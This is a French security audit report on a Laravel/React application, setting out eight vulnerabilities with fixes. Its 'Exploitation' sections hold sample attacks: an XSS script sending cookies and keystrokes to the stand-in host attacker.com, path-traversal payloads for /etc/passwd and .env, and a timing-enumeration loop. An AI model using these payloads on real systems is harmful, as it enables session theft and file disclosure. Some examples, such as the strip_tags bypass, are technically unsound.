# 🔒 AUDIT DE SÉCURITÉ AVANCÉ - AIG-APP
## Date: 2025-10-07
## Auditeur: Expert Laravel/React/Sécurité Web

---

## 📋 RÉSUMÉ EXÉCUTIF

Suite au premier audit de sécurité et à l'implémentation des correctifs, un second audit approfondi a été réalisé pour identifier les vulnérabilités résiduelles et les nouvelles failles potentielles.

**Résultat global**: ✅ **AMÉLIORÉ** - La posture de sécurité de l'application a été considérablement renforcée, mais certaines vulnérabilités critiques persistent.

### Score de Sécurité
- **Premier audit**: 4/10 🔴
- **Après corrections**: 7.5/10 🟡
- **Audit avancé actuel**: Identification de 8 nouvelles vulnérabilités

---

## 🔴 VULNÉRABILITÉS CRITIQUES

### 1. **XSS (Cross-Site Scripting) via dangerouslySetInnerHTML**
**Sévérité**: 🔴 CRITIQUE
**CVSS Score**: 8.8 (High)
**CWE**: CWE-79

**Description**:
L'application utilise `dangerouslySetInnerHTML` dans 11 fichiers React/TSX pour afficher du contenu HTML provenant de la base de données, notamment le contenu des articles. Cela expose l'application à des attaques XSS stockées.

**Fichiers affectés**:
```
/resources/js/Pages/Articles/Show.tsx:380
/resources/js/Pages/Articles/Index.tsx
/resources/js/Pages/Profile/Partials/TwoFactorAuthenticationForm.tsx
/resources/js/Pages/Programs/Index.tsx
/resources/js/Pages/Stocks/Index.tsx
/resources/js/Pages/Departments/Index.tsx
/resources/js/Pages/Events/Index.tsx
/resources/js/Pages/Groups/Index.tsx
/resources/js/Pages/Books/Index.tsx
/resources/js/Pages/Messages/Index.tsx
/resources/js/Pages/BookRentals/Index.tsx
```

**Code vulnérable**:
```tsx
// Articles/Show.tsx ligne 380
<div dangerouslySetInnerHTML={{ __html: article.content }} />
```

**Exploitation**:
```javascript
// Un attaquant peut injecter du JavaScript malveillant dans le contenu d'un article
<script>
  // Vol de cookies de session
  fetch('https://attacker.com/steal?cookie=' + document.cookie);

  // Keylogger
  document.addEventListener('keydown', e => {
    fetch('https://attacker.com/log?key=' + e.key);
  });
</script>

// Ou utiliser des payloads plus subtils
<img src=x onerror="alert(document.cookie)">
<iframe src="javascript:alert('XSS')"></iframe>
```

**Impact**:
- Vol de sessions utilisateurs
- Exécution de code JavaScript arbitraire dans le navigateur de la victime
- Redirection vers des sites malveillants
- Défacement de page
- Vol d'informations sensibles (tokens CSRF, données personnelles)
- Installation de keyloggers

**Correction recommandée**:
```typescript
// Option 1: Sanitize HTML avec DOMPurify
import DOMPurify from 'dompurify';

<div dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(article.content, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3', 'ul', 'ol', 'li', 'a'],
    ALLOWED_ATTR: ['href', 'title', 'target'],
    ALLOW_DATA_ATTR: false
  })
}} />

// Option 2: Backend sanitization avec HTMLPurifier
// Dans ArticleController.php
use HTMLPurifier;
use HTMLPurifier_Config;

$config = HTMLPurifier_Config::createDefault();
$purifier = new HTMLPurifier($config);
$validated['content'] = $purifier->purify($validated['content']);

// Option 3: Utiliser react-markdown au lieu de dangerouslySetInnerHTML
import ReactMarkdown from 'react-markdown';
<ReactMarkdown>{article.content}</ReactMarkdown>
```

---

### 2. **Mass Assignment Vulnerability - Champ `avatar` non protégé**
**Sévérité**: 🔴 CRITIQUE
**CVSS Score**: 7.5 (High)
**CWE**: CWE-915

**Description**:
Le modèle User expose le champ `avatar` dans le `$fillable`, permettant potentiellement à un attaquant de manipuler le chemin de l'avatar pour pointer vers des fichiers sensibles du système.

**Fichier**: `/app/Models/User.php:25-32`

**Code vulnérable**:
```php
protected $fillable = [
    'first_name',
    'last_name',
    'email',
    'password',
    'birth_date',
    'avatar', // ⚠️ VULNÉRABLE
];
```

**Exploitation**:
```javascript
// Attaque via formulaire de mise à jour du profil
fetch('/profile', {
  method: 'PATCH',
  body: JSON.stringify({
    first_name: 'John',
    avatar: '../../../../etc/passwd', // Path traversal
    // ou
    avatar: 'javascript:alert(1)', // XSS stocké
    // ou
    avatar: '../../../storage/app/.env' // Lecture de fichiers sensibles
  })
});
```

**Impact**:
- Path traversal pour accéder à des fichiers système
- XSS stocké via le chemin de l'avatar
- Bypasser la validation de fichier upload
- Information disclosure

**Correction recommandée**:
```php
// Option 1: Retirer avatar de $fillable et gérer manuellement
protected $fillable = [
    'first_name',
    'last_name',
    'email',
    'password',
    'birth_date',
    // 'avatar' RETIRÉ
];

// Dans ProfileController
public function update(Request $request)
{
    $validated = $request->validate([
        'first_name' => 'required|string|max:255',
        'last_name' => 'required|string|max:255',
        'avatar' => 'nullable|image|mimes:jpeg,png,jpg|max:2048'
    ]);

    if ($request->hasFile('avatar')) {
        $fileUploadService = new FileUploadService();
        $avatarPath = $fileUploadService->uploadImage(
            $request->file('avatar'),
            'avatars'
        );
        $request->user()->avatar = $avatarPath;
    }

    $request->user()->update($validated->except('avatar'));
}
```

---

### 3. **Insuffisance de Sanitization dans TrainingController::enroll()**
**Sévérité**: 🟠 HAUTE
**CVSS Score**: 6.5 (Medium)
**CWE**: CWE-20

**Description**:
Bien que la validation ait été renforcée, le champ `motivation` est sanitisé avec `strip_tags()` qui est insuffisant contre certaines attaques XSS et ne protège pas contre l'injection de caractères spéciaux.

**Fichier**: `/app/Http/Controllers/TrainingController.php:253`

**Code actuel**:
```php
// Sanitize motivation text
$validated['motivation'] = strip_tags($validated['motivation']);
```

**Problème**:
- `strip_tags()` peut être contourné avec des payloads encodés
- Ne protège pas contre les injections de caractères spéciaux
- Peut laisser passer du JavaScript dans les attributs HTML

**Exploitation**:
```html
<!-- Payload qui bypass strip_tags() -->
<img src=x onerror='alert(1)' />
<!-- devient -->
<img src=x onerror='alert(1)' />

<!-- Ou avec encodage -->
<scri<script>pt>alert(1)</scri</script>pt>
```

**Correction recommandée**:
```php
use Illuminate\Support\Facades\Validator;
use HTMLPurifier;

// Validation stricte
$validated = $request->validate([
    'motivation' => ['required', 'string', 'min:50', 'max:2000',
                     'regex:/^[a-zA-Z0-9\s\.,!?\-àâäéèêëïîôùûüÿçÀÂÄÉÈÊËÏÎÔÙÛÜŸÇ\'\"]+$/u']
]);

// Sanitization avec HTMLPurifier
$config = HTMLPurifier_Config::createDefault();
$config->set('HTML.Allowed', ''); // Aucune balise HTML autorisée
$purifier = new HTMLPurifier($config);
$validated['motivation'] = $purifier->purify($validated['motivation']);

// Ou simplement utiliser htmlspecialchars
$validated['motivation'] = htmlspecialchars($validated['motivation'], ENT_QUOTES, 'UTF-8');
```

---

## 🟠 VULNÉRABILITÉS HAUTES

### 4. **IDOR dans BookRentalController - Vérification insuffisante**
**Sévérité**: 🟠 HAUTE
**CVSS Score**: 7.1 (High)
**CWE**: CWE-639

**Description**:
Le contrôleur BookRentalController vérifie manuellement la propriété avec `if ($rental->user_id !== Auth::id())` au lieu d'utiliser les policies, ce qui est sujet aux erreurs et peut être oublié lors de futures modifications.

**Fichier**: `/app/Http/Controllers/BookRentalController.php:50,64,99`

**Code vulnérable**:
```php
// BookRentalController.php:50
if ($rental->user_id !== Auth::id() && !Auth::user()->can('manage library')) {
    abort(403);
}

// BookRentalController.php:64
if ($rental->user_id !== Auth::id() && !Auth::user()->can('manage library')) {
    abort(403);
}

// BookRentalController.php:99
if ($rental->user_id !== Auth::id()) {
    abort(403);
}
```

**Problèmes**:
- Logique d'autorisation dupliquée (violation du principe DRY)
- Risque d'oubli lors de l'ajout de nouvelles méthodes
- Tests unitaires plus difficiles
- Pas de centralisation de la logique d'autorisation

**Correction recommandée**:
```php
// 1. Créer BookRentalPolicy
php artisan make:policy BookRentalPolicy --model=BookRental

// app/Policies/BookRentalPolicy.php
public function view(User $user, BookRental $rental): bool
{
    return $user->id === $rental->user_id || $user->can('manage library');
}

public function update(User $user, BookRental $rental): bool
{
    return $user->id === $rental->user_id || $user->can('manage library');
}

// 2. Enregistrer dans AppServiceProvider
protected $policies = [
    // ...
    \App\Models\BookRental::class => \App\Policies\BookRentalPolicy::class,
];

// 3. Utiliser dans le contrôleur
public function show(BookRental $rental): Response
{
    $this->authorize('view', $rental);
    // ...
}

public function returnBook(BookRental $rental): RedirectResponse
{
    $this->authorize('update', $rental);
    // ...
}
```

---

### 5. **Exposition d'Informations Sensibles dans UserDashboardController**
**Sévérité**: 🟠 HAUTE
**CVSS Score**: 6.5 (Medium)
**CWE**: CWE-200

**Description**:
Le contrôleur UserDashboardController expose potentiellement des informations sensibles sur les formations et événements à des utilisateurs non autorisés en utilisant des requêtes trop permissives.

**Fichier**: `/app/Http/Controllers/UserDashboardController.php:54-68`

**Code vulnérable**:
```php
// Ligne 54-68
$availableTrainings = Training::where('status', 'active')
    ->with('topic')
    ->orderBy('created_at', 'desc')
    ->take(10)
    ->get()
    ->map(function ($training) use ($user) {
        return [
            'id' => $training->id,
            'title' => $training->title,
            'description' => $training->description, // ⚠️ Peut contenir des infos sensibles
            'topic' => $training->topic?->name ?? 'Non catégorisé',
            'duration_hours' => $training->duration_hours,
            'is_enrolled' => $training->enrollments()->where('user_id', $user->id)->exists(),
        ];
    });
```

**Problèmes**:
- Pas de vérification de `is_active` ou `is_public` pour les formations
- Exposition de toutes les formations actives sans restriction de visibilité
- Requête N+1 potential avec `$training->enrollments()->where(...)->exists()`
- Pas de limitation basée sur les rôles/permissions

**Correction recommandée**:
```php
// Ajouter un champ is_public à Training et filtrer
$availableTrainings = Training::where('status', 'active')
    ->where('is_active', true)
    ->where(function($query) use ($user) {
        $query->where('is_public', true)
              ->orWhereHas('allowedRoles', function($q) use ($user) {
                  $q->whereIn('role_id', $user->roles->pluck('id'));
              });
    })
    ->with(['topic', 'enrollments' => function($query) use ($user) {
        $query->where('user_id', $user->id);
    }])
    ->orderBy('created_at', 'desc')
    ->take(10)
    ->get()
    ->map(function ($training) {
        return [
            'id' => $training->id,
            'title' => $training->title,
            'description' => Str::limit($training->description, 200), // Limiter l'expo
            'topic' => $training->topic?->name ?? 'Non catégorisé',
            'duration_hours' => $training->duration_hours,
            'is_enrolled' => $training->enrollments->isNotEmpty(),
        ];
    });
```

---

### 6. **Manque de Protection contre les attaques Timing dans ChatController**
**Sévérité**: 🟠 HAUTE
**CVSS Score**: 5.9 (Medium)
**CWE**: CWE-208

**Description**:
Le contrôleur ChatController vérifie si un utilisateur est participant à une room en utilisant des comparaisons qui peuvent être exploitées via des attaques de timing pour déterminer l'existence de rooms privées.

**Fichier**: `/app/Http/Controllers/ChatController.php:98,130`

**Code vulnérable**:
```php
// Ligne 98
if (!$room->participants()->where('user_id', Auth::id())->exists()) {
    abort(403);
}

// Ligne 130
if (!$room->participants()->where('user_id', Auth::id())->exists()) {
    abort(403);
}
```

**Problème**:
- La requête `exists()` peut prendre plus de temps si la room contient beaucoup de participants
- Un attaquant peut mesurer le temps de réponse pour déterminer si une room existe
- Permet l'énumération de rooms privées

**Exploitation**:
```javascript
// Mesurer le temps de réponse pour déterminer l'existence de rooms
const times = [];
for (let roomId = 1; roomId <= 1000; roomId++) {
    const start = performance.now();
    await fetch(`/chat/rooms/${roomId}/messages`);
    const end = performance.now();
    times.push({roomId, duration: end - start});
}

// Les rooms avec un temps de réponse plus long peuvent indiquer l'existence
const suspiciousRooms = times.filter(t => t.duration > threshold);
```

**Correction recommandée**:
```php
// Utiliser un cache ou une table pivot indexée pour accélérer la vérification
public function getMessages(ChatRoom $room, Request $request): JsonResponse
{
    // Utiliser Gate avec Policy
    $this->authorize('view', $room);

    // Reste du code...
}

// ChatRoomPolicy.php
public function view(User $user, ChatRoom $room): bool
{
    // Utiliser un cache Redis pour éviter les timing attacks
    $cacheKey = "user:{$user->id}:room:{$room->id}:participant";

    return Cache::remember($cacheKey, 3600, function() use ($user, $room) {
        return $room->participants()->where('user_id', $user->id)->exists();
    });
}

// Ajouter un délai constant pour masquer les différences de timing
if (!$this->authorize('view', $room)) {
    usleep(random_int(10000, 50000)); // 10-50ms de délai aléatoire
    abort(403);
}
```

---

## 🟡 VULNÉRABILITÉS MOYENNES

### 7. **Requêtes N+1 potentielles dans EventController**
**Sévérité**: 🟡 MOYENNE
**CVSS Score**: 4.3 (Medium)
**CWE**: CWE-400 (Uncontrolled Resource Consumption)

**Description**:
Le contrôleur EventController peut générer des requêtes N+1 lors de la vérification des participants, entraînant une dégradation des performances et potentiellement un DoS.

**Fichier**: `/app/Http/Controllers/EventController.php`

**Impact**:
- Ralentissement significatif de l'application avec beaucoup d'événements
- Consommation excessive de ressources de base de données
- Possibilité de DoS par épuisement des ressources

**Correction**:
```php
// EventController.php - index()
$events = Event::with(['category', 'user', 'tags', 'participants' => function($query) {
        $query->where('user_id', Auth::id());
    }])
    ->withCount(['likes', 'participants'])
    ->latest('published_at')
    ->paginate(12);

// Puis dans la vue
$event->participants->isNotEmpty() // Au lieu de $event->participants()->where(...)->exists()
```

---

### 8. **Absence de Content Security Policy (CSP) stricte**
**Sévérité**: 🟡 MOYENNE
**CVSS Score**: 5.3 (Medium)
**CWE**: CWE-693

**Description**:
La CSP actuelle dans SecurityHeaders middleware est trop permissive avec `'unsafe-inline'` et `'unsafe-eval'` ce qui réduit considérablement son efficacité contre les attaques XSS.

**Fichier**: `/app/Http/Middleware/SecurityHeaders.php`

**Code actuel**:
```php
$response->headers->set('Content-Security-Policy',
    "default-src 'self'; " .
    "script-src 'self' 'unsafe-inline' 'unsafe-eval'; " . // ⚠️ TROP PERMISSIF
    "style-src 'self' 'unsafe-inline'; " .
    // ...
);
```

**Correction recommandée**:
```php
// Utiliser des nonces pour les scripts inline
$nonce = base64_encode(random_bytes(16));
$request->attributes->set('csp_nonce', $nonce);

$response->headers->set('Content-Security-Policy',
    "default-src 'self'; " .
    "script-src 'self' 'nonce-{$nonce}'; " .
    "style-src 'self' 'nonce-{$nonce}'; " .
    "img-src 'self' data: https: blob:; " .
    "font-src 'self' data:; " .
    "connect-src 'self'; " .
    "media-src 'self'; " .
    "object-src 'none'; " .
    "frame-ancestors 'none'; " .
    "base-uri 'self'; " .
    "form-action 'self'; " .
    "upgrade-insecure-requests;"
);

// Dans les vues Blade/Inertia
<script nonce="{{ request()->attributes->get('csp_nonce') }}">
    // Code JavaScript inline
</script>
```

---

## ✅ BONNES PRATIQUES IMPLÉMENTÉES

1. ✅ **Policies d'autorisation** - EventPolicy, ArticlePolicy, BookPolicy, TrainingPolicy créées
2. ✅ **FileUploadService** - Validation MIME, suppression EXIF, UUID naming
3. ✅ **Rate Limiting** - Implémenté pour login, register, uploads, chat
4. ✅ **Security Headers** - Middleware créé avec CSP, X-Frame-Options, etc.
5. ✅ **AuditLogService** - Service de logging créé pour audit de sécurité
6. ✅ **Session sécurisée** - SESSION_ENCRYPT=true, SESSION_HTTP_ONLY=true
7. ✅ **Password hashing** - Utilisation de bcrypt (Laravel par défaut)
8. ✅ **CSRF Protection** - Laravel CSRF protection activée
9. ✅ **SQL Injection Protection** - Utilisation d'Eloquent ORM et requêtes paramétrées
10. ✅ **2FA Support** - Laravel Fortify avec TwoFactorAuthenticatable

---

## 📊 ANALYSE DES DÉPENDANCES

### Packages PHP (composer.json)
```json
"require": {
    "php": "^8.2",
    "laravel/framework": "^12.0", // ✅ Version récente
    "laravel/fortify": "^1.31", // ✅ Dernière version
    "intervention/image": "^3.11", // ✅ Dernière version
    "spatie/laravel-permission": "^6.21", // ✅ Dernière version
}
```

**Statut**: ✅ Aucune CVE connue dans les packages principaux

### Packages NPM (package.json)
```json
"dependencies": {
    "react": "^19.1.1", // ✅ Version récente
    "@inertiajs/react": "^2.1.2", // ✅ Dernière version
    "@tiptap/react": "^3.6.2", // ✅ Dernière version
    "axios": "^1.11.0", // ✅ Dernière version
}
```

**Recommandation**: Installer et utiliser `DOMPurify` pour la sanitization HTML:
```bash
npm install dompurify
npm install --save-dev @types/dompurify
```

---

## 🎯 PLAN D'ACTION PRIORITAIRE

### Priorité 1 - CRITIQUE (À corriger immédiatement)
1. **XSS via dangerouslySetInnerHTML** - Implémenter DOMPurify dans tous les fichiers TSX
2. **Mass Assignment sur User.avatar** - Retirer avatar de $fillable et gérer manuellement

### Priorité 2 - HAUTE (À corriger sous 7 jours)
3. **IDOR dans BookRentalController** - Créer BookRentalPolicy
4. **Sanitization insuffisante** - Améliorer la sanitization dans TrainingController
5. **Exposition d'informations** - Filtrer les données sensibles dans UserDashboardController
6. **Timing attacks** - Implémenter ChatRoomPolicy avec cache

### Priorité 3 - MOYENNE (À corriger sous 30 jours)
7. **Requêtes N+1** - Optimiser les requêtes avec eager loading
8. **CSP stricte** - Implémenter CSP avec nonces au lieu de unsafe-inline

---

## 🛡️ RECOMMANDATIONS GÉNÉRALES

### 1. Implémentation de la Défense en Profondeur
```php
// Créer un middleware de sanitization global
class SanitizeInput
{
    public function handle(Request $request, Closure $next)
    {
        $input = $request->all();

        array_walk_recursive($input, function (&$value) {
            if (is_string($value)) {
                $value = strip_tags($value);
                $value = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
            }
        });

        $request->merge($input);
        return $next($request);
    }
}
```

### 2. Monitoring et Alerting
```php
// Implémenter un système de détection d'intrusion
class SecurityMonitoring
{
    public static function detectXSS(string $input): bool
    {
        $xssPatterns = [
            '/<script\b[^>]*>/i',
            '/javascript:/i',
            '/on\w+\s*=/i',
            '/<iframe\b[^>]*>/i',
        ];

        foreach ($xssPatterns as $pattern) {
            if (preg_match($pattern, $input)) {
                Log::channel('security')->warning('XSS attempt detected', [
                    'input' => $input,
                    'user' => auth()->id(),
                    'ip' => request()->ip(),
                ]);
                return true;
            }
        }

        return false;
    }
}
```

### 3. Tests de Sécurité Automatisés
```php
// tests/Feature/Security/XSSTest.php
class XSSTest extends TestCase
{
    public function test_article_content_sanitized()
    {
        $xssPayload = '<script>alert("XSS")</script>';

        $response = $this->actingAs($user)->post('/articles', [
            'title' => 'Test',
            'content' => $xssPayload,
            'category_id' => 1,
        ]);

        $article = Article::latest()->first();
        $this->assertStringNotContainsString('<script>', $article->content);
    }
}
```

---

## 📈 PROCHAINES ÉTAPES

1. **Installer DOMPurify** et l'implémenter dans toutes les vues React
2. **Créer BookRentalPolicy et ChatRoomPolicy**
3. **Ajouter HTMLPurifier** pour la sanitization backend
4. **Configurer CSP avec nonces**
5. **Implémenter des tests de sécurité automatisés**
6. **Mettre en place un WAF (Web Application Firewall)**
7. **Auditer régulièrement les dépendances** avec `npm audit` et `composer audit`
8. **Former l'équipe de développement** aux bonnes pratiques de sécurité

---

## 📞 CONTACTS

Pour toute question concernant ce rapport d'audit, contactez l'équipe de sécurité.

**Date du rapport**: 2025-10-07
**Version**: 2.0 (Audit Avancé)
**Statut**: CONFIDENTIEL
